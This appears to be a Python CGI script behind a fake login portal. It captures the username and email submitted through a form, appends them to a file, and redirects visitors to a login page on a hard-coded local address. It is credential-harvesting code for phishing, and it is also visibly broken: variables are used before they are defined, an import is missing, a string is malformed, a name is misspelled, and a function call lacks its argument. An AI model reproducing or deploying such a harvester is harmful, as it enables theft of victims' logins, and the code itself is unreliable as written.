#!/usr/bin/python3
#set these to the names of the inputs to catch them
i1name = 'username'
i2name = 'email'
i3name = 'submit'
input1 = formdata.getvalue(i1name)
input2 = formdata.getvalue(i2name)
input3 = formdata.getvalue(i3name)
formdata = cgi.FieldStorage()
portalpage = '/login.php.html'
PORT = '8000'
ipaddress = '192.168.0.8'
def savecredentials(filename):
    try:
        with open(filename, 'ab') as filehandle:
            input1 = formdata.getvalue(i1name)
            input2 = formdata.getvalue(i2name)
            input3 = formdata.getvalue(i3name)
            filehandle.write(formdata.getvalue(i1name))
            filehandle.write('\n')
            filehandle.write(formdata.getvalue(i2name))
            filehandle.write('\n\n')
            filehandle.close()
    except Exception as e:
        raise

#whenever this script is called you get sent to the portal first
print('Content-Type : text/html')
print('Location : /' + portalpage)
print("")
print('<html>\n<head>\n<meta http-equiv="refresh" content="0;url='ipadrress + PORT + portalpage + '" />\n</head>\n<body></body>\n</html>')

savecredentials()
